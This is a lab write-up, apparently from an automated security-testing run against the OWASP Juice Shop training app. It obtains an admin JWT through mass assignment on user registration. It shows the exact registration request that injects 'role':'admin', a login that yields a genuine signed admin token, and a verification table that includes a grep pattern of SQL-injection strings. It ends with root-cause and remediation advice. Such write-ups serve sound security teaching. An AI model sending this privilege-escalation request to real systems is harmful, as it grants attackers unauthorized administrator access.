# c07 — Admin session token WITHOUT SQL injection (final run)

**Target:** http://host.docker.internal:3000 — OWASP Juice Shop 20.3.0
**Goal:** obtain an admin-session token with no SQL syntax at all.
**Status:** ✅ COMPLETE — genuine, server-signed RS256 admin JWT obtained.

**Deliverable:** `/workspace/evidence/c7_no_sqli_token.txt`
**PoC:** `/workspace/pocs/c7b_admin_reg_massassign.py`
**Run log:** `/workspace/evidence/c7c_poc_run.log`
**Verification:** `/workspace/evidence/c7c_verification.log`

## Vector — Mass Assignment on registration (CWE-915)
`POST /api/Users` merges the entire client JSON body into the new user record, including
a `role` field the registration form never sends.

```http
POST /api/Users
Content-Type: application/json

{"email":"c7admin...@juice.sh","password":"P4ssw0rd-C7-noSQLi!",
 "passwordRepeat":"P4ssw0rd-C7-noSQLi!","role":"admin"}
```
→ `HTTP 201`, response echoes `"role":"admin"` and `profileImage: defaultAdmin.png`.

Then a normal login mints a *legitimate* session token:
`POST /rest/user/login` → `HTTP 200`, `authentication.token`, header `{"typ":"JWT","alg":"RS256"}`,
payload `data.role == "admin"`, `data.id == 25`.

No forgery, no algorithm confusion, no SQL syntax.

## Verification
| check | result |
|---|---|
| registration response role | `admin` |
| JWT payload role / id | `admin` / 25 |
| signature vs `/encryptionkeys/jwt.pub` (RS256) | **VALID** — genuinely server-signed |
| `GET /api/Users` with token | 200, 24 users, all admin accounts listed |
| `GET /rest/user/authentication-details` | 200 (admin data) |
| challenge `registerAdminChallenge` | **solved = true** |
| control: one signature char altered | **401** |
| SQL syntax in PoC (`grep union|OR 1=1|--|;'`) | none |

Note: this lab instance has authorization middleware missing on several read endpoints
(`/api/Users`, `/rest/user/authentication-details`, `/api/Complaints` return 200 to any
authenticated user), so role discrimination was proven via the signed JWT payload, the
`registerAdminChallenge` server-side flag, and crypto verification rather than endpoint 403s.

## Root cause
Registration handler persists privileged attributes from untrusted input (no allow-list):
effectively `User.create(req.body)`.

## Remediation
- Whitelist assignable registration fields (email, password, username only).
- Never accept `role` from clients; assign server-side defaults.
- Schema validation with unknown-key rejection (`additionalProperties:false` / Joi `stripUnknown`).
- Audit every model endpoint for mass assignment of privileged attributes.
